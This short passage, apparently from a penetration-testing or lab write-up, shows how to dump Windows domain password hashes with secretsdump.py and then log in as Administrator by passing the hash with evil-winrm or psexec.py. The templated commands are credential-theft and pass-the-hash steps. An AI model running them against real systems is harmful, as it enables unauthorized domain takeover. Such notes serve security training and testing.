We could dump all hashes using ```secretsdump.py``` script, if our user have the privileges to retrieve all of the password hashes including the administator’s hash.
<br>

```
secretsdump.py <domain name>/<username>:<password>@<target ip>
```
then we could login using the dumped administrator hash:

```
evil-winrm -i <target ip> -u Administrator -H <the admin hash>
#OR
psexec.py <domain>/administrator@<target ip> -hashes <the admin hash>
```
